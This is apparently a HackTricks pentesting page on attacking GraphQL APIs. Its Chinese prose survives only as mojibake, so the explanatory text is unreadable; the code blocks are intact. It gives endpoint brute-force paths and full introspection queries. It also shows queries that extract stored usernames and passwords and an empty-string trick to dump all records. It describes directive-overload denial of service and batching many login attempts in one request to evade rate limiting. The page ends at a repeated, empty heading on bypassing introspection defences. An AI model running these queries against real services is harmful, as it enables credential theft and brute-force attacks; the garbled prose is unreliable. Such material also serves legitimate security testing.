# GraphQL

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆçš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ç®€ä»‹

GraphQL è¢«**å¼ºè°ƒ**ä¸º REST API çš„**é«˜æ•ˆæ›¿ä»£æ–¹æ¡ˆ**ï¼Œæä¾›äº†ä¸€ç§ç®€åŒ–çš„æ–¹æ³•æ¥æŸ¥è¯¢åç«¯æ•°æ®ã€‚ä¸ REST ç›¸æ¯”ï¼Œåè€…é€šå¸¸éœ€è¦è·¨å¤šä¸ªç«¯ç‚¹å‘å‡ºå¤šä¸ªè¯·æ±‚ä»¥æ”¶é›†æ•°æ®ï¼ŒGraphQL å¯ä»¥é€šè¿‡**å•ä¸ªè¯·æ±‚**è·å–æ‰€æœ‰æ‰€éœ€ä¿¡æ¯ã€‚è¿™ç§ç®€åŒ–æ˜¾è‘—åœ°**æœ‰åˆ©äºå¼€å‘äººå‘˜**ï¼Œå‡å°‘äº†æ•°æ®è·å–è¿‡ç¨‹çš„å¤æ‚æ€§ã€‚

## GraphQL å’Œå®‰å…¨æ€§

éšç€æ–°æŠ€æœ¯çš„å‡ºç°ï¼ŒåŒ…æ‹¬ GraphQLï¼Œä¹Ÿå‡ºç°äº†æ–°çš„å®‰å…¨æ¼æ´ã€‚éœ€è¦æ³¨æ„çš„ä¸€ä¸ªå…³é”®ç‚¹æ˜¯ï¼Œ**GraphQL é»˜è®¤ä¸åŒ…å«èº«ä»½éªŒè¯æœºåˆ¶**ã€‚å¼€å‘äººå‘˜æœ‰è´£ä»»å®æ–½è¿™äº›å®‰å…¨æªæ–½ã€‚æ²¡æœ‰é€‚å½“çš„èº«ä»½éªŒè¯ï¼ŒGraphQL ç«¯ç‚¹å¯èƒ½ä¼šå‘æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·æš´éœ²æ•æ„Ÿä¿¡æ¯ï¼Œæ„æˆé‡å¤§å®‰å…¨é£é™©ã€‚

### ç›®å½•æš´åŠ›æ”»å‡»å’Œ GraphQL

ä¸ºäº†è¯†åˆ«æš´éœ²çš„ GraphQL å®ä¾‹ï¼Œå»ºè®®åœ¨ç›®å½•æš´åŠ›æ”»å‡»ä¸­åŒ…å«ç‰¹å®šè·¯å¾„ã€‚è¿™äº›è·¯å¾„åŒ…æ‹¬ï¼š

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

è¯†åˆ«å¼€æ”¾çš„ GraphQL å®ä¾‹å…è®¸æ£€æŸ¥æ”¯æŒçš„æŸ¥è¯¢ã€‚è¿™å¯¹äºäº†è§£é€šè¿‡ç«¯ç‚¹è®¿é—®çš„æ•°æ®è‡³å…³é‡è¦ã€‚GraphQL çš„å†…çœç³»ç»Ÿé€šè¿‡è¯¦ç»†è¯´æ˜æ¨¡å¼æ”¯æŒçš„æŸ¥è¯¢æ¥å®ç°è¿™ä¸€ç‚¹ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è€ƒ GraphQL å…³äºå†…çœçš„æ–‡æ¡£ï¼š[**GraphQLï¼šç”¨äº API çš„æŸ¥è¯¢è¯­è¨€ã€‚**](https://graphql.org/learn/introspection/)

### æŒ‡çº¹

å·¥å…· [**graphw00f**](https://github.com/dolevf/graphw00f) èƒ½å¤Ÿæ£€æµ‹æœåŠ¡å™¨ä¸­ä½¿ç”¨çš„ GraphQL å¼•æ“ï¼Œç„¶åä¸ºå®‰å…¨å®¡è®¡äººå‘˜æä¾›ä¸€äº›æœ‰ç”¨ä¿¡æ¯ã€‚

#### é€šç”¨æŸ¥è¯¢ <a href="#universal-queries" id="universal-queries"></a>

è¦æ£€æŸ¥ URL æ˜¯å¦æ˜¯ GraphQL æœåŠ¡ï¼Œå¯ä»¥å‘é€ä¸€ä¸ª**é€šç”¨æŸ¥è¯¢** `query{__typename}`ã€‚å¦‚æœå“åº”åŒ…å« `{"data": {"__typename": "Query"}}`ï¼Œåˆ™ç¡®è®¤è¯¥ URL æ‰˜ç®¡äº†ä¸€ä¸ª GraphQL ç«¯ç‚¹ã€‚æ­¤æ–¹æ³•ä¾èµ–äº GraphQL çš„ `__typename` å­—æ®µï¼Œè¯¥å­—æ®µæ˜¾ç¤ºäº†æŸ¥è¯¢å¯¹è±¡çš„ç±»å‹ã€‚
```javascript
query{__typename}
```
### åŸºæœ¬æšä¸¾

GraphQLé€šå¸¸æ”¯æŒ**GET**ï¼Œ**POST**ï¼ˆx-www-form-urlencodedï¼‰å’Œ**POST**ï¼ˆjsonï¼‰ã€‚å°½ç®¡å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œå»ºè®®ä»…å…è®¸jsonä»¥é˜²æ­¢CSRFæ”»å‡»ã€‚

#### è‡ªçœ

è¦ä½¿ç”¨è‡ªçœæ¥å‘ç°æ¨¡å¼ä¿¡æ¯ï¼Œè¯·æŸ¥è¯¢`__schema`å­—æ®µã€‚æ­¤å­—æ®µåœ¨æ‰€æœ‰æŸ¥è¯¢çš„æ ¹ç±»å‹ä¸Šéƒ½å¯ç”¨ã€‚
```bash
query={__schema{types{name,fields{name}}}}
```
ä½¿ç”¨æ­¤æŸ¥è¯¢ï¼Œæ‚¨å°†æ‰¾åˆ°æ­£åœ¨ä½¿ç”¨çš„æ‰€æœ‰ç±»å‹çš„åç§°ï¼š

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

ä½¿ç”¨æ­¤æŸ¥è¯¢ï¼Œæ‚¨å¯ä»¥æå–æ‰€æœ‰ç±»å‹ã€å­—æ®µå’Œå‚æ•°ï¼ˆä»¥åŠå‚æ•°çš„ç±»å‹ï¼‰ã€‚è¿™å°†éå¸¸æœ‰ç”¨ï¼Œä»¥äº†è§£å¦‚ä½•æŸ¥è¯¢æ•°æ®åº“ã€‚

![](<../../.gitbook/assets/image (207) (3).png>)

**é”™è¯¯**

äº†è§£**é”™è¯¯**æ˜¯å¦ä¼šè¢«**æ˜¾ç¤º**å¾ˆæœ‰è¶£ï¼Œå› ä¸ºå®ƒä»¬å°†æä¾›æœ‰ç”¨çš„**ä¿¡æ¯**ã€‚
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**é€šè¿‡å†…çœæšä¸¾æ•°æ®åº“æ¨¡å¼**

{% hint style="info" %}
å¦‚æœå¯ç”¨äº†å†…çœä½†ä¸Šè¿°æŸ¥è¯¢æ— æ³•è¿è¡Œï¼Œè¯·å°è¯•ä»æŸ¥è¯¢ç»“æ„ä¸­åˆ é™¤`onOperation`ã€`onFragment`å’Œ`onField`æŒ‡ä»¤ã€‚
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
å†…è”åå°„æŸ¥è¯¢ï¼š
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
æœ€åä¸€è¡Œä»£ç æ˜¯ä¸€ä¸ªGraphQLæŸ¥è¯¢ï¼Œå°†ä»GraphQLä¸­è½¬å‚¨æ‰€æœ‰å…ƒä¿¡æ¯ï¼ˆå¯¹è±¡åç§°ã€å‚æ•°ã€ç±»å‹...ï¼‰

![](<../../.gitbook/assets/image (206).png>)

å¦‚æœå¯ç”¨äº†å†…çœï¼Œæ‚¨å¯ä»¥ä½¿ç”¨[**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager)åœ¨GUIä¸­æŸ¥çœ‹æ‰€æœ‰é€‰é¡¹ã€‚

### æŸ¥è¯¢

ç°åœ¨æˆ‘ä»¬çŸ¥é“æ•°æ®åº“ä¸­ä¿å­˜äº†å“ªç§ä¿¡æ¯ï¼Œè®©æˆ‘ä»¬å°è¯•**æå–ä¸€äº›å€¼**ã€‚

åœ¨å†…çœä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°**å¯ä»¥ç›´æ¥æŸ¥è¯¢çš„å¯¹è±¡**ï¼ˆå› ä¸ºæ‚¨ä¸èƒ½ä»…ä»…å› ä¸ºå¯¹è±¡å­˜åœ¨å°±æŸ¥è¯¢å¯¹è±¡ï¼‰ã€‚åœ¨ä¸‹å›¾ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°"_queryType_"è¢«ç§°ä¸º"_Query_"ï¼Œè€Œ"_Query_"å¯¹è±¡çš„ä¸€ä¸ªå­—æ®µæ˜¯"_flags_"ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ç±»å‹ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥æŸ¥è¯¢flagå¯¹è±¡ã€‚

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

è¯·æ³¨æ„ï¼ŒæŸ¥è¯¢"_flags_"çš„ç±»å‹æ˜¯"_Flags_"ï¼Œå¹¶ä¸”æ­¤å¯¹è±¡å®šä¹‰å¦‚ä¸‹ï¼š

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

æ‚¨å¯ä»¥çœ‹åˆ°"_Flags_"å¯¹è±¡ç”±**name**å’Œ**value**ç»„æˆï¼Œç„¶åæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢è·å–æ‰€æœ‰æ ‡å¿—çš„åç§°å’Œå€¼ï¼š
```javascript
query={flags{name, value}}
```
è¯·æ³¨æ„ï¼Œå¦‚æœè¦æŸ¥è¯¢çš„å¯¹è±¡æ˜¯åƒä»¥ä¸‹ç¤ºä¾‹ä¸­çš„å­—ç¬¦ä¸²è¿™æ ·çš„**åŸºæœ¬ç±»å‹**

![](<../../.gitbook/assets/image (441).png>)

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢ï¼š
```javascript
query={hiddenFlags}
```
åœ¨å¦ä¸€ä¸ªç¤ºä¾‹ä¸­ï¼Œ"_Query_" ç±»å‹å¯¹è±¡å†…æœ‰ 2 ä¸ªå¯¹è±¡ï¼š"_user_" å’Œ "_users_"ã€‚\
å¦‚æœè¿™äº›å¯¹è±¡ä¸éœ€è¦ä»»ä½•å‚æ•°æ¥æœç´¢ï¼Œåªéœ€è¯·æ±‚æ‰€éœ€çš„æ•°æ®å³å¯**æ£€ç´¢æ‰€æœ‰ä¿¡æ¯**ã€‚åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œä½ å¯ä»¥æå–å·²ä¿å­˜çš„ç”¨æˆ·åå’Œå¯†ç ï¼š

![](<../../.gitbook/assets/image (208).png>)

ç„¶è€Œï¼Œåœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œå¦‚æœä½ å°è¯•è¿™æ ·åšï¼Œä½ ä¼šæ”¶åˆ°è¿™ä¸ª**é”™è¯¯**ï¼š

![](<../../.gitbook/assets/image (210).png>)

çœ‹èµ·æ¥å®ƒä¼šä½¿ç”¨ç±»å‹ä¸º _**Int**_ çš„ "_**uid**_" å‚æ•°è¿›è¡Œæœç´¢ã€‚\
æ— è®ºå¦‚ä½•ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“ï¼Œåœ¨[åŸºæœ¬æšä¸¾](graphql.md#basic-enumeration)éƒ¨åˆ†æå‡ºäº†ä¸€ä¸ªæŸ¥è¯¢ï¼Œæ˜¾ç¤ºäº†æˆ‘ä»¬æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ï¼š`query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

å¦‚æœä½ é˜…è¯»æä¾›çš„å›¾åƒï¼Œå½“æˆ‘è¿è¡Œè¯¥æŸ¥è¯¢æ—¶ï¼Œä½ ä¼šçœ‹åˆ° "_**user**_" å…·æœ‰ç±»å‹ä¸º _Int_ çš„ **arg** "_**uid**_"ã€‚

å› æ­¤ï¼Œé€šè¿‡è¿›è¡Œä¸€äº›è½»é‡çº§ _**uid**_ æš´åŠ›ç ´è§£ï¼Œæˆ‘å‘ç°åœ¨ _**uid**=**1**_ æ—¶æ£€ç´¢åˆ°äº†ä¸€ä¸ªç”¨æˆ·åå’Œä¸€ä¸ªå¯†ç ï¼š\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

è¯·æ³¨æ„ï¼Œæˆ‘**å‘ç°**æˆ‘å¯ä»¥è¯·æ±‚å‚æ•° "_**user**_" å’Œ "_**password**_"ï¼Œå› ä¸ºå¦‚æœæˆ‘å°è¯•æŸ¥æ‰¾ä¸å­˜åœ¨çš„å†…å®¹ (`query={user(uid:1){noExists}}`)ï¼Œæˆ‘ä¼šæ”¶åˆ°è¿™ä¸ªé”™è¯¯ï¼š

![](<../../.gitbook/assets/image (213).png>)

åœ¨**æšä¸¾é˜¶æ®µ**æœŸé—´ï¼Œæˆ‘å‘ç° "_**dbuser**_" å¯¹è±¡çš„å­—æ®µä¸º "_**user**_" å’Œ "_**password**_ã€‚

**æŸ¥è¯¢å­—ç¬¦ä¸²è½¬å‚¨æŠ€å·§ï¼ˆæ„Ÿè°¢ @BinaryShadow\_ï¼‰**

å¦‚æœä½ å¯ä»¥æŒ‰å­—ç¬¦ä¸²ç±»å‹æœç´¢ï¼Œæ¯”å¦‚ï¼š`query={theusers(description: ""){username,password}}`ï¼Œå¹¶ä¸”ä½ **æœç´¢ç©ºå­—ç¬¦ä¸²**ï¼Œå®ƒå°†**è½¬å‚¨æ‰€æœ‰æ•°æ®**ã€‚(_è¯·æ³¨æ„ï¼Œæ­¤ç¤ºä¾‹ä¸æ•™ç¨‹ç¤ºä¾‹æ— å…³ï¼Œå¯¹äºæ­¤ç¤ºä¾‹ï¼Œè¯·å‡è®¾ä½ å¯ä»¥ä½¿ç”¨ "**theusers**" æœç´¢åä¸º "**description**" çš„ String å­—æ®µ_).

### æœç´¢

åœ¨è¿™ä¸ªè®¾ç½®ä¸­ï¼Œä¸€ä¸ª**æ•°æ®åº“**åŒ…å«**äººå‘˜**å’Œ**ç”µå½±**ã€‚**äººå‘˜**ç”±ä»–ä»¬çš„**ç”µå­é‚®ä»¶**å’Œ**å§“å**æ ‡è¯†ï¼›**ç”µå½±**ç”±å®ƒä»¬çš„**åç§°**å’Œ**è¯„åˆ†**æ ‡è¯†ã€‚**äººå‘˜**å¯ä»¥äº’ç›¸æˆä¸ºæœ‹å‹ï¼Œä¹Ÿå¯ä»¥æ‹¥æœ‰ç”µå½±ï¼Œè¡¨ç¤ºæ•°æ®åº“å†…çš„å…³ç³»ã€‚

ä½ å¯ä»¥é€šè¿‡**å§“å**æœç´¢äººå‘˜å¹¶è·å–ä»–ä»¬çš„ç”µå­é‚®ä»¶ï¼š
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
æ‚¨å¯ä»¥é€šè¿‡å§“åæœç´¢äººå‘˜å¹¶è·å–ä»–ä»¬è®¢é˜…çš„ç”µå½±ï¼š
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
æ³¨æ„å¦‚ä½•æŒ‡ç¤ºæ£€ç´¢äººçš„`subscribedMovies`çš„`name`ã€‚

æ‚¨è¿˜å¯ä»¥**åŒæ—¶æœç´¢å¤šä¸ªå¯¹è±¡**ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœç´¢äº†2éƒ¨ç”µå½±ï¼š
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
ç”šè‡³æ˜¯ä½¿ç”¨åˆ«åæ¥å…³è”å¤šä¸ªä¸åŒå¯¹è±¡çš„å…³ç³»ï¼š
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### å˜å¼‚

**å˜å¼‚ç”¨äºåœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œæ›´æ”¹ã€‚**

åœ¨**å†…çœ**ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°**å£°æ˜çš„å˜å¼‚**ã€‚åœ¨ä¸‹é¢çš„å›¾åƒä¸­ï¼Œ"_MutationType_"è¢«ç§°ä¸º"_Mutation_"ï¼Œè€Œ"_Mutation_"å¯¹è±¡åŒ…å«å˜å¼‚çš„åç§°ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸º"_addPerson_"ï¼‰ï¼š

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

åœ¨è¿™ä¸ªè®¾ç½®ä¸­ï¼Œä¸€ä¸ª**æ•°æ®åº“**åŒ…å«**äººå‘˜**å’Œ**ç”µå½±**ã€‚**äººå‘˜**é€šè¿‡ä»–ä»¬çš„**ç”µå­é‚®ä»¶**å’Œ**å§“å**è¿›è¡Œæ ‡è¯†ï¼›**ç”µå½±**é€šè¿‡å®ƒä»¬çš„**åç§°**å’Œ**è¯„åˆ†**è¿›è¡Œæ ‡è¯†ã€‚**äººå‘˜**å¯ä»¥äº’ç›¸æˆä¸ºæœ‹å‹ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥æ‹¥æœ‰ç”µå½±ï¼Œè¡¨ç¤ºæ•°æ®åº“å†…çš„å…³ç³»ã€‚

åœ¨æ•°æ®åº“ä¸­**åˆ›å»ºæ–°çš„**ç”µå½±çš„å˜å¼‚å¯ä»¥å¦‚ä¸‹ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå˜å¼‚è¢«ç§°ä¸º`addMovie`ï¼‰ï¼š
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**æ³¨æ„æŸ¥è¯¢ä¸­æŒ‡å®šäº†æ•°æ®çš„å€¼å’Œç±»å‹ã€‚**

æ­¤å¤–ï¼Œæ•°æ®åº“æ”¯æŒä¸€ä¸ªåä¸º `addPerson` çš„ **mutation** æ“ä½œï¼Œå…è®¸åˆ›å»º **persons** å¹¶å°†å®ƒä»¬ä¸ç°æœ‰çš„ **friends** å’Œ **movies** å…³è”èµ·æ¥ã€‚é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œå¿…é¡»åœ¨å°†å®ƒä»¬é“¾æ¥åˆ°æ–°åˆ›å»ºçš„äººä¹‹å‰ï¼Œfriends å’Œ movies å¿…é¡»åœ¨æ•°æ®åº“ä¸­é¢„å…ˆå­˜åœ¨ã€‚
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### æŒ‡ä»¤è¿‡è½½

å¦‚[**æŠ¥å‘Šä¸­æè¿°çš„ä¸€ä¸ªæ¼æ´**](https://www.landh.tech/blog/20240304-google-hack-50000/)æ‰€è¿°ï¼ŒæŒ‡ä»¤è¿‡è½½æ„å‘³ç€è°ƒç”¨ä¸€ä¸ªæŒ‡ä»¤ç”šè‡³æ•°ç™¾ä¸‡æ¬¡ï¼Œä½¿æœåŠ¡å™¨æµªè´¹æ“ä½œï¼Œç›´åˆ°å¯èƒ½å¯¹å…¶è¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚

### åœ¨1ä¸ªAPIè¯·æ±‚ä¸­æ‰¹é‡æš´åŠ›ç ´è§£

è¿™äº›ä¿¡æ¯æ¥è‡ª[https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)ã€‚\
é€šè¿‡GraphQL APIè¿›è¡Œèº«ä»½éªŒè¯ï¼Œ**åŒæ—¶å‘é€è®¸å¤šå¸¦æœ‰ä¸åŒå‡­æ®çš„æŸ¥è¯¢**ä»¥è¿›è¡Œæ£€æŸ¥ã€‚è¿™æ˜¯ä¸€ç§ç»å…¸çš„æš´åŠ›ç ´è§£æ”»å‡»ï¼Œä½†ç°åœ¨ç”±äºGraphQLæ‰¹å¤„ç†åŠŸèƒ½ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªHTTPè¯·æ±‚ä¸­å‘é€å¤šä¸ªç™»å½•/å¯†ç å¯¹ã€‚è¿™ç§æ–¹æ³•ä¼šæ¬ºéª—å¤–éƒ¨é€Ÿç‡ç›‘æ§åº”ç”¨ç¨‹åºï¼Œè®©å…¶è®¤ä¸ºä¸€åˆ‡æ­£å¸¸ï¼Œæ²¡æœ‰æš´åŠ›ç ´è§£æœºå™¨äººè¯•å›¾çŒœæµ‹å¯†ç ã€‚

ä¸‹é¢æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºèº«ä»½éªŒè¯è¯·æ±‚çš„æœ€ç®€å•æ¼”ç¤ºï¼Œ**æ¯æ¬¡åŒæ—¶å‘é€3å¯¹ä¸åŒçš„ç”µå­é‚®ä»¶/å¯†ç **ã€‚æ˜¾ç„¶ï¼Œå¯ä»¥ä»¥ç›¸åŒçš„æ–¹å¼åœ¨å•ä¸ªè¯·æ±‚ä¸­å‘é€æ•°åƒä¸ªï¼š

![](<../../.gitbook/assets/image (182) (1).png>)

ä»å“åº”æˆªå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªè¯·æ±‚è¿”å›äº† _null_ å¹¶åœ¨ _error_ éƒ¨åˆ†åæ˜ äº†ç›¸åº”çš„ä¿¡æ¯ã€‚**ç¬¬äºŒä¸ªå˜å¼‚å…·æœ‰æ­£ç¡®çš„èº«ä»½éªŒè¯**æ•°æ®ï¼Œå“åº”å…·æœ‰æ­£ç¡®çš„èº«ä»½éªŒè¯ä¼šè¯ä»¤ç‰Œã€‚

![](<../../.gitbook/assets/image (119) (1).png>)

## æ— éœ€å†…çœçš„GraphQL

è¶Šæ¥è¶Šå¤šçš„**GraphQLç«¯ç‚¹ç¦ç”¨å†…çœ**ã€‚ç„¶è€Œï¼Œå½“æ”¶åˆ°æ„å¤–è¯·æ±‚æ—¶ï¼ŒGraphQLæŠ›å‡ºçš„é”™è¯¯è¶³ä»¥è®©åƒ[**clairvoyance**](https://github.com/nikitastupin/clairvoyance)è¿™æ ·çš„å·¥å…·é‡æ–°åˆ›å»ºå¤§éƒ¨åˆ†æ¨¡å¼ã€‚

æ­¤å¤–ï¼ŒBurp Suiteæ‰©å±•ç¨‹åº[**GraphQuail**](https://github.com/forcesunseen/graphquail)æ‰©å±•ç¨‹åº**è§‚å¯Ÿé€šè¿‡Burpä¼ é€’çš„GraphQL APIè¯·æ±‚**ï¼Œå¹¶**æ„å»º**ä¸€ä¸ªå†…éƒ¨GraphQL **æ¨¡å¼**ï¼Œæ¯æ¬¡çœ‹åˆ°æ–°æŸ¥è¯¢æ—¶éƒ½ä¼šæ„å»ºã€‚å®ƒè¿˜å¯ä»¥ä¸ºGraphiQLå’ŒVoyagerå…¬å¼€æ¨¡å¼ã€‚å½“æ¥æ”¶åˆ°å†…çœæŸ¥è¯¢æ—¶ï¼Œè¯¥æ‰©å±•ç¨‹åºè¿”å›ä¸€ä¸ªè™šå‡å“åº”ã€‚å› æ­¤ï¼ŒGraphQuailæ˜¾ç¤ºäº†APIä¸­å¯ç”¨äºä½¿ç”¨çš„æ‰€æœ‰æŸ¥è¯¢ã€å‚æ•°å’Œå­—æ®µã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[**æ­¤å¤„**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema)ã€‚

ä¸€ä¸ªä¸é”™çš„**å•è¯åˆ—è¡¨**ï¼Œç”¨äºå‘ç°[**GraphQLå®ä½“å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°**](https://github.com/Escape-Technologies/graphql-wordlist?)ã€‚

### ç»•è¿‡GraphQLå†…çœé˜²å¾¡ <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **ç»•è¿‡GraphQLå†…çœé˜²å¾¡**

